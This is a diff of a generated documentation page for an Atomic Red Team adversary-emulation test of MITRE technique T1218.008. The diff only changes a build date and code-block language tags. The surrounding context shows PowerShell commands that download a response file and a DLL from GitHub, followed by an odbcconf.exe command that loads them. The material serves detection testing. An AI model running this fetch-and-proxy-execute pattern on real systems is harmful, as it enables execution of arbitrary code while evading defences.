@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.008"
 attack_technique_name: "Signed Binary Proxy Execution: Odbcconf"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "331ce274-f9c9-440b-9f8c-a1006e1fce0b"
@@ -58,13 +58,13 @@ T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_fi
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{rsp_file_path}#{rsp_file_name}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp" -OutFile "#{rsp_file_path}#{rsp_file_name}"
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll" -OutFile "#{rsp_file_path}\o.dll"
 ```
@@ -75,7 +75,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 cd "#{rsp_file_path}"
 odbcconf.exe -f "#{rsp_file_name}"
 ```
